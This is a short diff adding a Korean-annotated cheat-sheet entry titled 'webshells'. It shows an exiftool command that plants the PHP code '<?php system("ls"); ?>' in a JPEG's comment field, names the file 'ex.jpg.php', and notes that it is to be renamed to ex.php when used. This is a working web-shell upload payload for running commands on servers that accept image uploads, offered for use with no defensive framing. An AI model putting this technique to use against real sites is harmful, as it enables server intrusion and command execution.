@@ -1,1 +1,5 @@
-webshells
+# webshells
+
+1. ex.jpg.php
+exiftool -Comment='<?php system("ls"); ?>' ex.jpg
+사용할때는 ex.php로 바꿔서 사용
